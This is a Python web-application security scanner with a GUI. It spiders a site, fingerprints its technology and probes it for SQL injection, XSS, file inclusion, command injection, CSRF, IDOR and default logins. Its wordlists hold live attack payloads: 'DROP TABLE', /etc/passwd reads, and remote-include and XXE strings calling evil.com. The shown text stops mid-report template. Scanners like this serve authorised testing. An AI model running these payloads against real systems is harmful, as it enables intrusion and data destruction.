#!/usr/bin/env python3
"""
Web Application Security Testing Framework (WASTF) with PySimpleGUI
Advanced security testing with multiple vulnerability scanners and integrations
BY CHAITANYA KULKARNI 
"""

import sys
import os
import json
import requests
import sqlite3
import threading
import queue
import time
import re
import hashlib
import base64
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin, quote, unquote
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Set, Tuple
from bs4 import BeautifulSoup
import html
import subprocess
import socket
import ssl
import ipaddress
import dns.resolver
import random
import string
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import csv
import yaml
import webbrowser
import platform
import asyncio
import aiohttp
from colorama import init, Fore, Style

# PySimpleGUI for GUI
try:
    import PySimpleGUI as sg
    GUI_AVAILABLE = True
    # Set theme
    sg.theme('DarkGrey13')
except ImportError:
    GUI_AVAILABLE = False

# Try to import additional security libraries
try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# Initialize colorama for colored output
init(autoreset=True)

# ============================================
# Enhanced Data Models
# ============================================

@dataclass
class Vulnerability:
    id: str
    name: str
    severity: str  # Critical, High, Medium, Low, Info
    description: str
    url: str
    parameter: str
    payload: str
    evidence: str
    recommendation: str
    cvss_score: float
    owasp_category: str
    timestamp: str
    cvss_vector: str = ""
    wasc_category: str = ""
    cwe_id: str = ""
    request: str = ""
    response: str = ""
    false_positive: bool = False
    verified: bool = False
    tags: List[str] = field(default_factory=list)

@dataclass
class TestResult:
    target_url: str
    start_time: str
    end_time: str
    vulnerabilities: List[Vulnerability]
    scan_type: str
    status: str
    tech_stack: Dict = field(default_factory=dict)
    stats: Dict = field(default_factory=dict)

@dataclass
class SecurityHeader:
    name: str
    value: str
    status: str  # Present/Missing/Insecure
    recommendation: str

# ============================================
# Logging Configuration
# ============================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('wastf.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================
# Advanced Security Testing Modules
# ============================================

class AdvancedSecurityTester:
    """Extended security tester with advanced capabilities"""
    
    def __init__(self, target_url, config=None):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.config = config or {}
        self.vulnerabilities = []
        self.csrf_token = None
        self.login_data = None
        self.wordlists = self.load_wordlists()
        self.fingerprints = self.load_fingerprints()
        self.driver = None
        self.scan_progress = 0
        self.scan_status = "Ready"
        self.stop_requested = False
        
    def load_wordlists(self):
        """Load attack wordlists"""
        wordlists = {
            'sqli': [
                "'", "';", "' OR '1'='1", "' UNION SELECT NULL--", 
                "' AND SLEEP(5)--", "' OR EXISTS(SELECT * FROM information_schema.tables)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' UNION SELECT database(),version(),user()--",
                "' OR '1'='1' --", "admin'--", "' WAITFOR DELAY '00:00:10'--",
                "1; DROP TABLE users--", "' OR 1=CONVERT(int, @@version)--",
                "' UNION SELECT NULL,NULL,NULL--", "' AND 1=2 UNION SELECT 1,2,3--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "onmouseover=alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<form><button formaction=javascript:alert('XSS')>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..//..//..//etc/passwd",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "file:///etc/passwd",
                "php://filter/resource=/etc/passwd",
                "php://filter/convert.base64-encode/resource=/etc/passwd"
            ],
            'rfi': [
                "http://evil.com/shell.php",
                "https://evil.com/shell.php",
                "ftp://evil.com/shell.txt",
                "\\\\evil.com\\share\\shell.php"
            ],
            'xxe': [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/xxe.dtd'>%remote;]><root></root>"
            ],
            'command_injection': [
                ";id", "|id", "||id", "&&id", "`id`", "$(id)",
                ";whoami", "|cat /etc/passwd", "||ping -c 5 127.0.0.1",
                "&&netstat -an", "`uname -a`", "$(uname -a)"
            ],
            'ssti': [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}",
                "{{config}}", "{{settings.SECRET_KEY}}", "{{''.__class__}}"
            ],
            'ssrf': [
                "http://127.0.0.1:22", "http://localhost:3306",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]:22", "http://0.0.0.0:22",
                "http://2130706433", "http://0177.0.0.1"
            ],
            'path_traversal': [
                "../../../", "../../../../", "../../../../../",
                "..\\..\\..\\", "..//..//..//", "....//....//....//"
            ],
            'no_sql_injection': [
                "' || '1' == '1", "'; return true;",
                "' && this.password.length > 0", "1, $where: '1' == '1'",
                "' || 1==1", "' && 1==1"
            ]
        }
        return wordlists
    
    def load_fingerprints(self):
        """Load technology fingerprints"""
        return {
            'cms': {
                'wordpress': ['wp-content', 'wp-includes', '/wp-admin/', 'WordPress'],
                'joomla': ['joomla', '/media/system/', '/components/com_'],
                'drupal': ['Drupal', '/sites/default/', '/misc/drupal.js'],
                'magento': ['Magento', '/skin/frontend/', '/js/mage/'],
                'laravel': ['laravel', 'csrf-token', '/storage/']
            },
            'server': {
                'apache': ['Apache', 'mod_'],
                'nginx': ['nginx'],
                'iis': ['Microsoft-IIS', 'X-Powered-By: ASP.NET'],
                'tomcat': ['Apache-Coyote', 'JSESSIONID']
            },
            'framework': {
                'django': ['Django', 'csrfmiddlewaretoken'],
                'flask': ['Flask', 'session='],
                'rails': ['Ruby on Rails', '_rails_session'],
                'spring': ['Spring', 'JSESSIONID']
            }
        }
    
    def update_progress(self, progress, status):
        """Update scan progress"""
        self.scan_progress = progress
        self.scan_status = status
    
    def detect_technology(self):
        """Detect web application technology"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            tech_info = {}
            
            # Check headers
            headers = response.headers
            if 'Server' in headers:
                tech_info['server'] = headers['Server']
            if 'X-Powered-By' in headers:
                tech_info['framework'] = headers['X-Powered-By']
            if 'X-Generator' in headers:
                tech_info['generator'] = headers['X-Generator']
                
            # Check cookies
            cookies = response.cookies
            if cookies:
                tech_info['cookies'] = {c.name: c.value for c in cookies}
                
            # Check HTML for framework indicators
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for meta tags
            meta_tags = soup.find_all('meta')
            for tag in meta_tags:
                if 'generator' in tag.get('name', '').lower():
                    tech_info['generator'] = tag.get('content', '')
                    
            # Look for script src patterns
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src']
                if 'jquery' in src.lower():
                    tech_info['jquery'] = True
                if 'react' in src.lower():
                    tech_info['react'] = True
                if 'vue' in src.lower():
                    tech_info['vue'] = True
                if 'angular' in src.lower():
                    tech_info['angular'] = True
                    
            # Check for technology fingerprints
            body_text = response.text.lower()
            for tech_type, fingerprints in self.fingerprints.items():
                for tech, patterns in fingerprints.items():
                    for pattern in patterns:
                        if pattern.lower() in body_text:
                            tech_info.setdefault(tech_type, []).append(tech)
                            
            return tech_info
        except Exception as e:
            logger.error(f"Tech detection error: {e}")
            return {"error": str(e)}
    
    def spider(self, max_depth=2):
        """Spider the website to find URLs"""
        visited = set()
        to_visit = [(self.target_url, 0)]
        found_urls = []
        
        while to_visit and not self.stop_requested:
            url, depth = to_visit.pop(0)
            
            if depth > max_depth or url in visited:
                continue
                
            visited.add(url)
            
            try:
                response = self.session.get(url, timeout=5)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(url, href)
                    
                    # Only follow links within target domain
                    if self.target_url in absolute_url and absolute_url not in visited:
                        found_urls.append(absolute_url)
                        to_visit.append((absolute_url, depth + 1))
                        
                # Also check forms
                for form in soup.find_all('form', action=True):
                    action = form['action']
                    absolute_url = urljoin(url, action)
                    if self.target_url in absolute_url and absolute_url not in visited:
                        found_urls.append(absolute_url)
                        to_visit.append((absolute_url, depth + 1))
                        
            except Exception as e:
                logger.debug(f"Error visiting {url}: {e}")
                continue
                
        return list(set(found_urls))
    
    def test_sql_injection(self, url):
        """Test for SQL Injection vulnerabilities"""
        logger.info(f"Testing SQL Injection on: {url}")
        
        payloads = self.wordlists['sqli']
        
        error_patterns = [
            "SQL syntax", "mysql_fetch", "PostgreSQL", "ORA-",
            "Microsoft.*ODBC", "Driver.*SQL", "Syntax error",
            "unclosed quotation", "quoted string", "SQL command",
            "SQLite", "MySQL", "MariaDB", "Warning.*mysqli",
            "Unclosed quotation mark", "You have an error in your SQL syntax"
        ]
        
        try:
            parsed = urlparse(url)
            if parsed.query:
                params = parsed.query.split('&')
                
                for param in params:
                    if self.stop_requested:
                        return False
                        
                    if '=' in param:
                        key, value = param.split('=', 1)
                        
                        for payload in payloads[:10]:  # Limit for performance
                            if self.stop_requested:
                                return False
                                
                            test_url = url.replace(f"{key}={value}", f"{key}={value}{payload}")
                            
                            try:
                                response = self.session.get(test_url, timeout=5)
                                
                                # Check for SQL errors
                                for pattern in error_patterns:
                                    if re.search(pattern, response.text, re.IGNORECASE):
                                        vuln = Vulnerability(
                                            id=f"SQLI-{len(self.vulnerabilities)+1}",
                                            name="SQL Injection",
                                            severity="High",
                                            description=f"SQL injection vulnerability detected in parameter '{key}'",
                                            url=url,
                                            parameter=key,
                                            payload=payload,
                                            evidence=f"Error pattern found: {pattern}",
                                            recommendation="Use parameterized queries/prepared statements. Implement input validation and escape special characters.",
                                            cvss_score=8.5,
                                            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                            owasp_category="A03:2021-Injection",
                                            cwe_id="CWE-89",
                                            timestamp=datetime.now().isoformat(),
                                            tags=["injection", "database"]
                                        )
                                        self.vulnerabilities.append(vuln)
                                        return True
                                        
                            except Exception:
                                continue
                                
        except Exception as e:
            logger.error(f"SQL Injection test error: {e}")
            
        return False
    
    def test_xss(self, url):
        """Test for Cross-Site Scripting vulnerabilities"""
        logger.info(f"Testing XSS on: {url}")
        
        payloads = self.wordlists['xss'][:10]  # Limit for performance
        
        try:
            parsed = urlparse(url)
            
            if parsed.query:
                params = parsed.query.split('&')
                
                for param in params:
                    if self.stop_requested:
                        return False
                        
                    if '=' in param:
                        key, value = param.split('=', 1)
                        
                        for payload in payloads:
                            if self.stop_requested:
                                return False
                                
                            # Test reflected XSS
                            test_url = url.replace(f"{key}={value}", f"{key}={payload}")
                            
                            try:
                                response = self.session.get(test_url, timeout=5)
                                
                                # Check if payload is reflected in response
                                if payload in response.text or html.escape(payload) in response.text:
                                    vuln = Vulnerability(
                                        id=f"XSS-{len(self.vulnerabilities)+1}",
                                        name="Cross-Site Scripting (Reflected)",
                                        severity="Medium",
                                        description=f"Reflected XSS vulnerability detected in parameter '{key}'",
                                        url=url,
                                        parameter=key,
                                        payload=payload,
                                        evidence="Payload is reflected in response without proper encoding",
                                        recommendation="Implement proper output encoding. Use Content Security Policy (CSP). Validate and sanitize all user inputs.",
                                        cvss_score=6.1,
                                        cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                                        owasp_category="A03:2021-Injection",
                                        cwe_id="CWE-79",
                                        timestamp=datetime.now().isoformat(),
                                        tags=["xss", "client-side"]
                                    )
                                    self.vulnerabilities.append(vuln)
                                    return True
                                    
                            except Exception:
                                continue
                                
        except Exception as e:
            logger.error(f"XSS test error: {e}")
            
        return False
    
    def test_file_inclusion(self, url):
        """Test for Local/Remote File Inclusion vulnerabilities"""
        logger.info(f"Testing File Inclusion on: {url}")
        
        lfi_payloads = self.wordlists['lfi'][:8]  # Limit for performance
        
        try:
            parsed = urlparse(url)
            if parsed.query:
                params = parsed.query.split('&')
                
                for param in params:
                    if self.stop_requested:
                        return False
                        
                    if '=' in param:
                        key, value = param.split('=', 1)
                        
                        for payload in lfi_payloads:
                            if self.stop_requested:
                                return False
                                
                            test_url = url.replace(f"{key}={value}", f"{key}={payload}")
                            
                            try:
                                response = self.session.get(test_url, timeout=8)
                                
                                # Check for signs of file inclusion
                                indicators = [
                                    'root:', 'daemon:', 'bin/', 'sys:', 'mysql:',
                                    '<?php', '#!/bin/bash', '#!/bin/sh',
                                    'DocumentRoot', 'ServerName'
                                ]
                                
                                for indicator in indicators:
                                    if indicator.lower() in response.text.lower():
                                        vuln = Vulnerability(
                                            id=f"LFI-{len(self.vulnerabilities)+1}",
                                            name="Local File Inclusion",
                                            severity="High",
                                            description=f"Local file inclusion vulnerability detected in parameter '{key}'",
                                            url=url,
                                            parameter=key,
                                            payload=payload,
                                            evidence=f"File content indicator found: {indicator}",
                                            recommendation="Validate and sanitize file path inputs. Use allowlists for allowed files. Implement proper file system permissions.",
                                            cvss_score=7.5,
                                            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                                            owasp_category="A03:2021-Injection",
                                            cwe_id="CWE-22",
                                            timestamp=datetime.now().isoformat(),
                                            tags=["lfi", "file-system"]
                                        )
                                        self.vulnerabilities.append(vuln)
                                        return True
                                        
                            except Exception:
                                continue
                                
        except Exception as e:
            logger.error(f"File inclusion test error: {e}")
            
        return False
    
    def test_command_injection(self, url):
        """Test for Command Injection vulnerabilities"""
        logger.info(f"Testing Command Injection on: {url}")
        
        cmd_payloads = self.wordlists['command_injection'][:8]
        
        try:
            parsed = urlparse(url)
            
            if parsed.query:
                params = parsed.query.split('&')
                
                for param in params:
                    if self.stop_requested:
                        return False
                        
                    if '=' in param:
                        key, value = param.split('=', 1)
                        
                        for payload in cmd_payloads:
                            if self.stop_requested:
                                return False
                                
                            test_url = url.replace(f"{key}={value}", f"{key}={value}{payload}")
                            
                            try:
                                start_time = time.time()
                                response = self.session.get(test_url, timeout=10)
                                response_time = time.time() - start_time
                                
                                # Check for command output indicators
                                indicators = [
                                    'uid=', 'gid=', 'groups=',
                                    'Volume Serial Number', 'Directory of',
                                    'inet addr:', 'windows', 'microsoft'
                                ]
                                
                                # Check for time-based injection
                                if response_time > 4:
                                    vuln = Vulnerability(
                                        id=f"CMD-{len(self.vulnerabilities)+1}",
                                        name="Command Injection (Time-based)",
                                        severity="High",
                                        description=f"Possible command injection via time delay in parameter '{key}'",
                                        url=url,
                                        parameter=key,
                                        payload=payload,
                                        evidence=f"Response delayed by {response_time:.2f} seconds",
                                        recommendation="Use proper input validation and sanitization. Avoid shell command execution with user input. Use safe APIs for system commands.",
                                        cvss_score=8.8,
                                        cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                        owasp_category="A03:2021-Injection",
                                        cwe_id="CWE-78",
                                        timestamp=datetime.now().isoformat(),
                                        tags=["command-injection", "os-command"]
                                    )
                                    self.vulnerabilities.append(vuln)
                                    return True
                                    
                                # Check for output in response
                                for indicator in indicators:
                                    if indicator.lower() in response.text.lower():
                                        vuln = Vulnerability(
                                            id=f"CMD-{len(self.vulnerabilities)+1}",
                                            name="Command Injection",
                                            severity="Critical",
                                            description=f"Command injection vulnerability detected in parameter '{key}'",
                                            url=url,
                                            parameter=key,
                                            payload=payload,
                                            evidence=f"Command output found: {indicator}",
                                            recommendation="Use proper input validation and sanitization. Avoid shell command execution with user input. Use safe APIs for system commands.",
                                            cvss_score=9.8,
                                            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                            owasp_category="A03:2021-Injection",
                                            cwe_id="CWE-78",
                                            timestamp=datetime.now().isoformat(),
                                            tags=["command-injection", "os-command"]
                                        )
                                        self.vulnerabilities.append(vuln)
                                        return True
                                        
                            except Exception:
                                continue
                                
        except Exception as e:
            logger.error(f"Command injection test error: {e}")
            
        return False
    
    def test_security_headers(self):
        """Test for missing security headers"""
        logger.info("Testing security headers")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
            security_headers = [
                {
                    'name': 'Content-Security-Policy',
                    'recommendation': 'Implement CSP to prevent XSS attacks',
                    'severity': 'Medium'
                },
                {
                    'name': 'X-Frame-Options',
                    'recommendation': 'Set to DENY or SAMEORIGIN to prevent clickjacking',
                    'severity': 'Medium'
                },
                {
                    'name': 'X-Content-Type-Options',
                    'recommendation': 'Set to nosniff to prevent MIME sniffing',
                    'severity': 'Low'
                },
                {
                    'name': 'Strict-Transport-Security',
                    'recommendation': 'Implement HSTS with max-age and includeSubDomains',
                    'severity': 'High'
                },
                {
                    'name': 'Referrer-Policy',
                    'recommendation': 'Set appropriate referrer policy',
                    'severity': 'Low'
                }
            ]
            
            for header in security_headers:
                if header['name'] not in headers:
                    vuln = Vulnerability(
                        id=f"HEADER-{len(self.vulnerabilities)+1}",
                        name=f"Missing Security Header: {header['name']}",
                        severity=header['severity'],
                        description=f"Missing security header: {header['name']}",
                        url=self.target_url,
                        parameter="HTTP Headers",
                        payload="",
                        evidence=f"Header {header['name']} is not present",
                        recommendation=header['recommendation'],
                        cvss_score=4.3 if header['severity'] == 'High' else 3.1 if header['severity'] == 'Medium' else 2.1,
                        cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
                        owasp_category="A05:2021-Security Misconfiguration",
                        cwe_id="CWE-693",
                        timestamp=datetime.now().isoformat(),
                        tags=["headers", "misconfiguration"]
                    )
                    self.vulnerabilities.append(vuln)
                    
        except Exception as e:
            logger.error(f"Security headers test error: {e}")
            
        return len([v for v in self.vulnerabilities if 'HEADER' in v.id]) > 0
    
    def test_directory_listing(self):
        """Test for directory listing enabled"""
        logger.info("Testing directory listing")
        
        test_paths = [
            '/', '/images/', '/css/', '/js/', '/uploads/', '/admin/',
            '/backup/', '/tmp/', '/logs/', '/vendor/', '/node_modules/'
        ]
        
        for path in test_paths:
            if self.stop_requested:
                return False
                
            test_url = urljoin(self.target_url, path)
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Check for directory listing indicators
                indicators = [
                    'Index of', 'Directory listing for', 'Parent Directory',
                    '<title>Index of', 'Last modified', 'Size '
                ]
                
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        vuln = Vulnerability(
                            id=f"DIR-{len(self.vulnerabilities)+1}",
                            name="Directory Listing Enabled",
                            severity="Low",
                            description=f"Directory listing enabled at {path}",
                            url=test_url,
                            parameter="Path",
                            payload=path,
                            evidence=f"Directory listing indicator: {indicator}",
                            recommendation="Disable directory listing in web server configuration",
                            cvss_score=3.5,
                            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                            owasp_category="A05:2021-Security Misconfiguration",
                            cwe_id="CWE-548",
                            timestamp=datetime.now().isoformat(),
                            tags=["directory-listing", "misconfiguration"]
                        )
                        self.vulnerabilities.append(vuln)
                        return True
                        
            except Exception:
                continue
                
        return False
    
    def test_http_methods(self):
        """Test for potentially dangerous HTTP methods"""
        logger.info("Testing HTTP methods")
        
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH']
        
        for method in dangerous_methods:
            if self.stop_requested:
                return False
                
            try:
                response = self.session.request(method, self.target_url, timeout=5)
                
                if response.status_code in [200, 201, 204]:
                    vuln = Vulnerability(
                        id=f"HTTP-{len(self.vulnerabilities)+1}",
                        name=f"Potentially Dangerous HTTP Method: {method}",
                        severity="Medium",
                        description=f"HTTP {method} method is enabled",
                        url=self.target_url,
                        parameter="HTTP Method",
                        payload=method,
                        evidence=f"HTTP {method} returns {response.status_code}",
                        recommendation=f"Disable {method} method unless required. Implement proper access controls.",
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        owasp_category="A05:2021-Security Misconfiguration",
                        cwe_id="CWE-650",
                        timestamp=datetime.now().isoformat(),
                        tags=["http-methods", "misconfiguration"]
                    )
                    self.vulnerabilities.append(vuln)
                    
            except Exception:
                continue
                
        return len([v for v in self.vulnerabilities if 'HTTP-' in v.id]) > 0
    
    def test_auth_flaws(self, login_url=None):
        """Test for authentication vulnerabilities"""
        logger.info("Testing authentication flaws")
        
        if not login_url:
            login_url = urljoin(self.target_url, "/login")
            
        vulnerabilities_found = []
        
        # Test default credentials
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test"),
            ("user", "user")
        ]
        
        for username, password in default_creds:
            if self.stop_requested:
                return vulnerabilities_found
                
            try:
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, timeout=5)
                
                # Check for successful login indicators
                if response.status_code == 302 or 'dashboard' in response.text.lower() or 'logout' in response.text.lower():
                    vuln = Vulnerability(
                        id=f"AUTH-{len(self.vulnerabilities)+1}",
                        name="Weak Default Credentials",
                        severity="High",
                        description=f"Default credentials work: {username}/{password}",
                        url=login_url,
                        parameter="username/password",
                        payload=f"username={username}, password={password}",
                        evidence="Successful login with default credentials",
                        recommendation="Change default credentials. Implement strong password policy. Enable multi-factor authentication.",
                        cvss_score=7.5,
                        cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        owasp_category="A07:2021-Identification and Authentication Failures",
                        cwe_id="CWE-521",
                        timestamp=datetime.now().isoformat(),
                        tags=["authentication", "credentials"]
                    )
                    self.vulnerabilities.append(vuln)
                    vulnerabilities_found.append(vuln)
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities_found
    
    def test_csrf(self, forms_url=None):
        """Test for CSRF vulnerabilities"""
        logger.info("Testing CSRF vulnerabilities")
        
        if not forms_url:
            forms_url = self.target_url
            
        try:
            response = self.session.get(forms_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                if self.stop_requested:
                    return False
                    
                csrf_token = form.find('input', {'name': ['csrf', 'csrf_token', '_token', 'authenticity_token']})
                
                if not csrf_token:
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    
                    if method == 'post' and action:
                        vuln = Vulnerability(
                            id=f"CSRF-{len(self.vulnerabilities)+1}",
                            name="Missing CSRF Protection",
                            severity="Medium",
                            description=f"Form at {action} lacks CSRF token",
                            url=forms_url,
                            parameter="form",
                            payload="POST request without CSRF token",
                            evidence="No CSRF token found in form",
                            recommendation="Implement CSRF tokens on all state-changing operations. Use SameSite cookie attribute.",
                            cvss_score=6.5,
                            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
                            owasp_category="A01:2021-Broken Access Control",
                            cwe_id="CWE-352",
                            timestamp=datetime.now().isoformat(),
                            tags=["csrf", "access-control"]
                        )
                        self.vulnerabilities.append(vuln)
                        return True
                        
        except Exception as e:
            logger.error(f"CSRF test error: {e}")
            
        return False
    
    def test_idor(self, url_pattern=None):
        """Test for Insecure Direct Object References"""
        logger.info("Testing IDOR vulnerabilities")
        
        test_ids = ["1", "2", "100", "admin", "test", "user"]
        
        if url_pattern and "{id}" in url_pattern:
            for test_id in test_ids:
                if self.stop_requested:
                    return False
                    
                test_url = url_pattern.replace("{id}", test_id)
                
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200:
                        vuln = Vulnerability(
                            id=f"IDOR-{len(self.vulnerabilities)+1}",
                            name="Insecure Direct Object Reference",
                            severity="Medium",
                            description=f"Predictable resource ID allows access to unauthorized data",
                            url=test_url,
                            parameter="id",
                            payload=test_id,
                            evidence=f"Able to access resource with ID: {test_id}",
                            recommendation="Implement proper authorization checks. Use UUIDs instead of sequential IDs. Implement access control lists.",
                            cvss_score=6.5,
                            cvss_vector="CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
                            owasp_category="A01:2021-Broken Access Control",
                            cwe_id="CWE-639",
                            timestamp=datetime.now().isoformat(),
                            tags=["idor", "access-control"]
                        )
                        self.vulnerabilities.append(vuln)
                        return True
                        
                except Exception:
                    continue
                    
        return False
    
    def run_comprehensive_scan(self, scan_types=None):
        """Run comprehensive security scan"""
        if not scan_types:
            scan_types = ['sql', 'xss', 'lfi', 'cmd', 'headers', 'auth', 'csrf', 'idor']
            
        self.stop_requested = False
        self.vulnerabilities = []
        
        logger.info(f"Starting comprehensive scan of {self.target_url}")
        
        total_tests = len(scan_types) + 1  # +1 for spidering
        current_test = 0
        
        # Technology detection
        self.update_progress(10, "Detecting technology stack...")
        tech_info = self.detect_technology()
        logger.info(f"Technology detected: {tech_info}")
        
        # Spider for URLs
        current_test += 1
        progress = int((current_test / total_tests) * 100)
        self.update_progress(progress, "Spidering website...")
        urls = self.spider(max_depth=1)
        urls.append(self.target_url)
        
        logger.info(f"Found {len(urls)} URLs to test")
        
        # Run tests on each URL
        for i, url in enumerate(set(urls)):
            if self.stop_requested:
                break
                
            logger.info(f"Testing URL {i+1}/{len(urls)}: {url}")
            
            for test_type in scan_types:
                if self.stop_requested:
                    break
                    
                current_test += 1
                progress = int((current_test / (total_tests + len(urls) * len(scan_types))) * 100)
                
                if test_type == 'sql':
                    self.update_progress(progress, f"Testing SQL Injection on {url}...")
                    self.test_sql_injection(url)
                    
                elif test_type == 'xss':
                    self.update_progress(progress, f"Testing XSS on {url}...")
                    self.test_xss(url)
                    
                elif test_type == 'lfi':
                    self.update_progress(progress, f"Testing File Inclusion on {url}...")
                    self.test_file_inclusion(url)
                    
                elif test_type == 'cmd':
                    self.update_progress(progress, f"Testing Command Injection on {url}...")
                    self.test_command_injection(url)
                    
                elif test_type == 'idor':
                    self.update_progress(progress, f"Testing IDOR on {url}...")
                    self.test_idor(url)
        
        # Run global tests
        if not self.stop_requested:
            self.update_progress(80, "Testing security headers...")
            self.test_security_headers()
            
        if not self.stop_requested:
            self.update_progress(85, "Testing directory listing...")
            self.test_directory_listing()
            
        if not self.stop_requested:
            self.update_progress(90, "Testing HTTP methods...")
            self.test_http_methods()
            
        if 'auth' in scan_types and not self.stop_requested:
            self.update_progress(92, "Testing authentication flaws...")
            self.test_auth_flaws()
            
        if 'csrf' in scan_types and not self.stop_requested:
            self.update_progress(95, "Testing CSRF...")
            self.test_csrf()
            
        self.update_progress(100, "Scan completed")
        
        logger.info(f"Scan completed. Found {len(self.vulnerabilities)} vulnerabilities.")
        return self.vulnerabilities, tech_info
    
    def stop_scan(self):
        """Stop the current scan"""
        self.stop_requested = True
        logger.info("Scan stop requested")

# ============================================
# Enhanced Report Generator
# ============================================

class EnhancedReportGenerator:
    @staticmethod
    def generate_html_report(test_result: TestResult, filename=None):
        """Generate enhanced HTML security report"""
        if not filename:
            filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            
        vulns_by_severity = {
            "Critical": [],
            "High": [],
            "Medium": [],
            "Low": [],
            "Info": []
        }
        
        for vuln in test_result.vulnerabilities:
            vulns_by_severity[vuln.severity].append(vuln)
            
        severity_counts = {sev: len(vulns) for sev, vulns in vulns_by_severity.items()}
        total_vulns = len(test_result.vulnerabilities)
        
        # Calculate risk score
        risk_score = sum(
            count * {"Critical": 10, "High": 7.5, "Medium": 5, "Low": 2.5, "Info": 1}[sev]
            for sev, count in severity_counts.items()
        ) / max(total_vulns, 1)
        
        # Severity colors
        severity_colors = {
            "Critical": "#ff3860",
            "High": "#ff7f00",
            "Medium": "#ffbf00",
            "Low": "#32cd32",
            "Info": "#6495ed"
        }
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Security Assessment Report - {test_result.target_url}</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <style>
                * {{
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }}
                
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    line-height: 1.6;
                    color: #333;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                }}
                
                .container {{
                    max-width: 1400px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                
                .report-card {{
                    background: white;
                    border-radius: 15px;
